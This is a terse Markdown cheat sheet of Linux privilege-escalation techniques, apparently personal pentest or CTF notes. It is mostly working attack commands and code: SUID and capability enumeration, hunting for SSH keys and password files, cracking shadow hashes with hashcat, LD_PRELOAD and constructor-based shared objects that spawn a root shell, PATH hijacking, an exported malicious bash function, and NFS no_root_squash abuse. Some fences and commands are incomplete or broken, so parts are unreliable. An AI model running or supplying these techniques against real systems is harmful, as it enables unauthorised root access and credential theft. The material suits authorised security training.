# Linux PE checks
----------

finding SUID

```bash
find / -perm -u=s -type f 2>/dev/null

find / -type f -perm -04000 -ls 2>/dev/null
```

capabilities:

```bash
getcap -r / 2>/dev/null
````


cron:

```bash
cat /etc/crontab
```

```bash
arp -a - ip neigh

netstat -ano


locate password | more

```


```bash
find / -name id_rsa 2>/dev/null

find / -name authorized_keys 2>/dev/null

find . -type f -exec grep -i -I "Password" {} /dev/null \;
```

/etc/shadow

```bash
unshadow passwd shadow
```

```cmd
hashcat -m 1800
```



ssh keys

id_rsa

```bash
chmod 600

ssh -i id_rsa root@10.10.10.10

```


LD_PRELOAD

we can pre load a custom binary before running a valid binary which can be run as root 

```bash
sudo -l
```

write a C code and compile it as a shared object:

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
	
	setgid(0);
	setuid(0);
	system("/bin/bash");
	
}

```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

sudo LD_PRELOAD=/home/cibbin/shell.so apache2
```


SUID

```


shared object injection:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

if some binary is looking supicious, check what its doing with strace

```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

overwrite files with write access 

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```bash
gcc -shared -fPIC -o /home/user/location_of_missing_binary
```


binary symlinks:



via environment variables:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

run strings on the suspicious binary 

print $PATH

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

```bash
gcc /tmp/service.c -o /tmp/service 
```

```bash
export PATH=/tmp:$PATH
```

/tmp is added to environmental variable and now it will be called first while looking for the binary service

creating a malicious function:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}

export -f /usr/sbin/service

```

cron jobs:
```bash
cat /etc/crontab
```

nfs root squashing:

```
cat /etc/exports
```

if the result says no_root_squash -> the /tmp folder can be mounted

```
showmount -e IP

mount -o rw,vers=2 IP:/tmp /tmp/mount
```

now make a malicious C file, compile it and make it executable